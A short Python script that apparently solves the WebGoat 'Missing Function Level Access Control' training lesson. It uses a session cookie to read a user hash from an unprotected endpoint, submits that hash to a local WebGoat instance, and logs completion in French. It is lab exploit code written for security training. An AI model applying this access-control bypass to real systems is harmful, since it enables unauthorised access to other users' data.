import requests
import json
import logging

def run_script(url, cookie, proxy='127.0.0.1:8081'):

    headers = {
        "Cookie": cookie,
        "Content-Type": "application/json"
    }
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    response = requests.get(url, headers=headers, proxies=proxies)
    user_hash = response.json()[0]["userHash"]    
    url = "http://127.0.0.1:8080/WebGoat/access-control/user-hash"
    params = {
        "userHash": user_hash
    }
    response = requests.post(url, params=params, headers=headers, proxies=proxies)
    json_response = json.loads(response.text)
    if json_response.get("lessonCompleted") == True:
        logging.info(f"[*] Hash trouvé : {params}")
        logging.info("[*] Challenge Missing Function Level Access Control validé ! :)\n")